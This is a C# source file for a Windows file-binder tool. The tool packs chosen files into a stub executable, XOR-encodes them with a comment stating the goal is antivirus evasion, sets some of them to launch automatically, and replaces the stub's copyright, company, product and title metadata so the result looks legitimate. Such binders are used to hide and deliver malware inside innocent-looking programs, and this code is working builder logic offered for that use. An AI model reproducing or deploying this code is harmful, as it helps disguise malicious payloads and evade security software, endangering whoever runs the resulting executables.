using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Binder.Properties;
using System.Threading;
using System.Diagnostics;

namespace Binder
{
    //文件索引“********（8字节，表示文件起始位置）********（8字节，表示文件大小）**********（10个字节，表示后缀名）”
    struct FileIndex
    {
        public long StartPos;
        public long FileSize;
        public string Extention;
        public string IsStart;
    }

    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class FormMain : Window
    {
        private List<FileIndex> fileTable = new List<FileIndex>();
        public FormMain()
        {
            InitializeComponent();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            //开启线程，反复检查是否有更新，若无更新则检查篡改
            Thread thread = new Thread(this.CheakUpdateAgain);
            thread.Start();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            string folder = string.Empty;

            System.Windows.Forms.FolderBrowserDialog folderDialog = new System.Windows.Forms.FolderBrowserDialog();

            if (folderDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                this.FilesToBind.Items.Clear();
                this.fileTable.Clear();
                folder = folderDialog.SelectedPath;//无斜杠
                DirectoryInfo di = new DirectoryInfo(folder);
                FileInfo[] fis = di.GetFiles();
                foreach (FileInfo fi in fis)
                {
                    this.FilesToBind.Items.Add(fi.FullName);
                }
            }
        }

        private void FilesToBind_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            ListBox lbox = sender as ListBox;
            if (e.ChangedButton == MouseButton.Left && lbox.SelectedItems.Count!=0)
            {
                if (this.FilesToStart.Items.Contains(lbox.SelectedItem))
	            {
                    MessageBox.Show("Selected Item has existed,Select again please!");
                }
                else
                {
                    this.FilesToStart.Items.Add(lbox.SelectedItem);
                }
            }
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            FormConfig formConfig = new FormConfig();
            formConfig.ShowDialog();
            if (!GlobalVars.a)
            {
                return;
            }
            var fileDialog = new Microsoft.Win32.SaveFileDialog();
            //设置过滤器
            fileDialog.Filter = "可执行文件|*.exe";
            if (fileDialog.ShowDialog() == true)
            {
                string fileName = fileDialog.FileName;

                this.fileTable.Clear();//清空文件索引表
                //修改主程序信息并释放主程序
                string currentPath = Environment.CurrentDirectory;
                byte[] bytesBindedExe = Binder.Properties.Resources.Zcy_Binder;
                FileStream fs = new FileStream(fileName, FileMode.Create);
                //替换程序信息
                bytesBindedExe = this.replaceProgramInfo(bytesBindedExe,GlobalVars.BanQuan,GlobalVars.ShangBiao,GlobalVars.ChanPin,GlobalVars.GongSi,GlobalVars.ShuoMing,GlobalVars.BiaoTi);
                //释放主程序
                fs.Write(bytesBindedExe, 0, bytesBindedExe.Length);
            
                //将要捆绑的文件信息记录到文件索引表
                foreach (var item in this.FilesToBind.Items)
                {
                    //读入要绑的文件
                    string fileFullName = item as string;
                    FileStream fs1 = new FileStream(fileFullName, FileMode.Open);
                    byte[] bytesFile1 = new byte[fs1.Length];
                    fs1.Read(bytesFile1, 0, bytesFile1.Length);
                    fs1.Close();
                    //获取要绑文件的信息
                    FileIndex fi = new FileIndex();
                    fi.StartPos = fs.Position;
                    fi.FileSize = bytesFile1.Length;
                    if (this.FilesToStart.Items.Contains(item))
                    {
                        fi.IsStart = "1";
                    }
                    else
                    {
                        fi.IsStart = "0";
                    }
                    //获取要绑文件的扩展名
                    FileInfo fileInfo = new FileInfo(fileFullName);
                    string ext = fileInfo.Extension;
                    fi.Extention = ext.Substring(1, ext.Length - 1); //包括点
                    //将要帮文件信息存入临时变量
                    this.fileTable.Add(fi);
                    //加密要绑文件达到免杀目的
                    bytesFile1 = GlobalVars.BinderHelper.EncodeOrDecode(bytesFile1, 0x01);
                    //将要绑文件写入主程序
                    fs.Write(bytesFile1, 0, bytesFile1.Length);

                }
                //记住（文件数量及文件索引表）的起始位置，以便传给主程序
                string fileTableStartPos = fs.Position.ToString();

                //写入捆绑文件的个数
                int fileNum = this.fileTable.Count;
                byte[] bytesFileNum = BitConverter.GetBytes(fileNum);
                fs.Write(bytesFileNum, 0, bytesFileNum.Length);

                //将文件索引表写入宿主文件
                foreach (FileIndex item in this.fileTable)
                {
                    byte[] bytesStartPos = BitConverter.GetBytes(item.StartPos);
                    byte[] bytesFileSize = BitConverter.GetBytes(item.FileSize);
                    byte[] bytesExtention1 = Encoding.Unicode.GetBytes(item.Extention);//可能不够20字节
                    byte[] bytesExtention = new byte[20];
                    Array.Copy(bytesExtention1, 0, bytesExtention, 0, bytesExtention1.Length);
                    for (int i = 0; i < 20 - bytesExtention1.Length; i = i + 2)
                    {
                        Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytesExtention, bytesExtention1.Length + i, 2);
                    }
                    byte[] bytesIsStart = Encoding.Unicode.GetBytes(item.IsStart);

                    fs.Write(bytesStartPos, 0, bytesStartPos.Length);
                    fs.Write(bytesFileSize, 0, bytesFileSize.Length);
                    fs.Write(bytesExtention, 0, bytesExtention.Length);
                    fs.Write(bytesIsStart, 0, bytesIsStart.Length);
                }

                fs.Close();


                //读取生成后的文件
                FileStream fileStream = new FileStream(fileName, FileMode.Open);
                byte[] bytesBindedExe1 = new byte[fileStream.Length];
                fileStream.Read(bytesBindedExe1, 0, bytesBindedExe1.Length);
                fileStream.Close();
                //替换主程序文件索引表的起始位置
                byte[] bytesFileTableStartPos = Encoding.Unicode.GetBytes(fileTableStartPos);
                int index1 = this.IndexOf(bytesBindedExe1, Encoding.Unicode.GetBytes("********"));
                //MessageBox.Show(index1.ToString());
                if (index1 == -1)
                {
                    MessageBox.Show("failed");
                    return;
                }
                Array.Copy(bytesFileTableStartPos, 0, bytesBindedExe1, index1, bytesFileTableStartPos.Length);
                for (int i = 0; i < 16 - bytesFileTableStartPos.Length; i = i + 2)
                {
                    Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytesBindedExe1, index1 + bytesFileTableStartPos.Length + i, 2);
                }

                //生成
                FileStream fileStream1 = new FileStream(fileName, FileMode.Create);
                fileStream1.Write(bytesBindedExe1, 0, bytesBindedExe1.Length);
                fileStream1.Close();

                MessageBox.Show("Succeed！！！");
            }
            
        }

        /// <summary>
        /// 替换程序信息
        /// </summary>
        /// <param name="bytes"></param>
        /// <returns>失败返回null</returns>
        private byte[] replaceProgramInfo(byte[] bytes, string banquan, string shangbiao, string chanpin, string gongsi, string shuoming, string biaoti)
        {
            //替换版权
            byte[] bytesBanQuan = Encoding.Unicode.GetBytes(banquan);
            int index5 = this.IndexOf(bytes, Encoding.Unicode.GetBytes("banquanbanquanbanquanbanquanbanquanbanquanbanquanbanquan"));
            if (index5 == -1)
            {
                MessageBox.Show("生成失败");
                return null;
            }
            Array.Copy(bytesBanQuan, 0, bytes, index5, bytesBanQuan.Length);
            for (int i = 0; i < 112 - bytesBanQuan.Length; i = i + 2)
            {
                Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytes, index5 + bytesBanQuan.Length + i, 2);
            }

            //替换商标
            byte[] bytesShangBiao = Encoding.Unicode.GetBytes(shangbiao);
            int index6 = this.IndexOf(bytes, Encoding.Unicode.GetBytes("shangbiaoshangbiaoshangbiaoshangbiaoshangbiaoshangbiao"));
            if (index6 == -1)
            {
                MessageBox.Show("生成失败");
                return null;
            }
            Array.Copy(bytesShangBiao, 0, bytes, index6, bytesShangBiao.Length);
            for (int i = 0; i < 108 - bytesShangBiao.Length; i = i + 2)
            {
                Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytes, index6 + bytesShangBiao.Length + i, 2);
            }

            //替换产品
            byte[] bytesChanPin = Encoding.Unicode.GetBytes(chanpin);
            int index7 = this.IndexOf(bytes, Encoding.Unicode.GetBytes("chanpinchanpinchanpinchanpinchanpinchanpinchanpinchanpin"));
            if (index7 == -1)
            {
                MessageBox.Show("生成失败");
                return null;
            }
            Array.Copy(bytesChanPin, 0, bytes, index7, bytesChanPin.Length);
            for (int i = 0; i < 112 - bytesChanPin.Length; i = i + 2)
            {
                Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytes, index7 + bytesChanPin.Length + i, 2);
            }

            //替换公司
            byte[] bytesGongSi = Encoding.Unicode.GetBytes(gongsi);
            int index8 = this.IndexOf(bytes, Encoding.Unicode.GetBytes("gongsigongsigongsigongsigongsigongsigongsigongsigongsi"));
            if (index8 == -1)
            {
                MessageBox.Show("生成失败");
                return null;
            }
            Array.Copy(bytesGongSi, 0, bytes, index8, bytesGongSi.Length);
            for (int i = 0; i < 108 - bytesGongSi.Length; i = i + 2)
            {
                Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytes, index8 + bytesGongSi.Length + i, 2);
            }

            //替换说明
            byte[] bytesShuoMing = Encoding.Unicode.GetBytes(shuoming);
            int index9 = this.IndexOf(bytes, Encoding.Unicode.GetBytes("shuomingshuomingshuomingshuomingshuomingshuomingshuoming"));
            if (index9 == -1)
            {
                MessageBox.Show("生成失败");
                return null;
            }
            Array.Copy(bytesShuoMing, 0, bytes, index9, bytesShuoMing.Length);
            for (int i = 0; i < 112 - bytesShuoMing.Length; i = i + 2)
            {
                Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytes, index9 + bytesShuoMing.Length + i, 2);
            }

            //替换标题
            byte[] bytesBiaoTi = Encoding.Unicode.GetBytes(biaoti);
            int index10 = this.IndexOf(bytes, Encoding.Unicode.GetBytes("biaotibiaotibiaotibiaotibiaotibiaotibiaotibiaotibiaoti"));
            if (index10 == -1)
            {
                MessageBox.Show("生成失败");
                return null;
            }
            Array.Copy(bytesBiaoTi, 0, bytes, index10, bytesBiaoTi.Length);
            for (int i = 0; i < 108 - bytesBiaoTi.Length; i = i + 2)
            {
                Array.Copy(Encoding.Unicode.GetBytes(" "), 0, bytes, index10 + bytesBiaoTi.Length + i, 2);
            }

            return bytes;
        }

        /// <summary>  
        /// 报告指定的 System.Byte[] 在此实例中的第一个匹配项的索引。  
        /// </summary>  
        /// <param name="srcBytes">被执行查找的 System.Byte[]。</param>  
        /// <param name="searchBytes">要查找的 System.Byte[]。</param>  
        /// <returns>如果找到该字节数组，则为 searchBytes 的索引位置；如果未找到该字节数组，则为 -1。如果 searchBytes 为 null 或者长度为0，则返回值为 -1。</returns>  
        private int IndexOf(byte[] srcBytes, byte[] searchBytes)
        {
            if (srcBytes == null) { return -1; }
            if (searchBytes == null) { return -1; }
            if (srcBytes.Length == 0) { return -1; }
            if (searchBytes.Length == 0) { return -1; }
            if (srcBytes.Length < searchBytes.Length) { return -1; }
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1) { return i; }
                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }
                    if (flag) { return i; }
                }
            }
            return -1;
        }

        private void FilesToStart_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            ListBox lbox = sender as ListBox;
            if (e.ChangedButton == MouseButton.Left && lbox.SelectedItems.Count != 0)
            {
                this.FilesToStart.Items.Remove(lbox.SelectedItem);
            }
        }


        /// <summary>
        /// 反复检查更新以及检查篡改的方法
        /// </summary>
        private void CheakUpdateAgain()
        {
            bool isLoop = true;
            string result = string.Empty;

            //检查是否联网
            if (GlobalVars.BinderHelper.IsConnectedInternet())
            {
                while (isLoop)
                {
                    result = GlobalVars.BinderHelper.ExploreWeb("http://www.wwskyl.com/update_binder.php");//可能被重导向导致返回错误结果

                    if (result.Length < 10 && result != string.Empty)//能连到更新网址
                    {
                        isLoop = false;
                        if (result != GlobalVars.Version) //有更新
                        {
                            this.Dispatcher.Invoke(new Action(() =>
                            {
                                if (MessageBox.Show("有更新，请更新后再使用") == MessageBoxResult.OK)
                                {
                                    GlobalVars.BinderHelper.ExeCmd("explorer.exe http://bbs.wwskyl.com/");
                                }
                                Environment.Exit(0);
                            }));
                        }
                        else  //没有更新，检查篡改
                        {
                            string result1 = this.checkJuggle();
                            if (result1 != string.Empty)
                            {
                                if (result1 == "程序被篡改\r\n")
                                {

                                    this.Dispatcher.Invoke(new Action(() =>
                                    {
                                        if (MessageBox.Show("程序已经被篡改，请重新下载使用") == MessageBoxResult.OK)
                                        {
                                            GlobalVars.BinderHelper.ExeCmd("explorer.exe http://bbs.wwskyl.com/");
                                        }
                                        Environment.Exit(0);
                                    }));
                                }
                                //检测通过
                            }
                            else
                            {
                                this.Dispatcher.Invoke(new Action(() =>
                                {
                                    if (MessageBox.Show("缺少某些必要文件，请重新下载使用") == MessageBoxResult.OK)
                                    {
                                        GlobalVars.BinderHelper.ExeCmd("explorer.exe http://bbs.wwskyl.com/");
                                    }
                                    Environment.Exit(0);
                                }));
                            }
                        }
                    }
                    else
                    {
                        //若连不上更新网址则反复连
                        isLoop = true;
                        Thread.Sleep(7000);
                    }
                }
            }
            else
            {
                this.Dispatcher.Invoke(new Action(() =>
                {
                    MessageBox.Show("请联网", "提示");
                    Environment.Exit(0);
                }));
            }
        }

        //利用另一个程序检测主程序是否被篡改，应当检测副本，否则会出现文件占用错误
        private string checkJuggle()
        {
            string tempPath = System.IO.Path.GetTempPath();
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, tempPath + "625672845724682457645692865.exe", true);
            string result = GlobalVars.BinderHelper.StartCmdTool("", GlobalVars.CurrentPath + @"\ck.zcy", "6174656352387734582.exe","625672845724682457645692865");
            return result;
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            this.FilesToBind.Items.Clear();
        }
    }
}
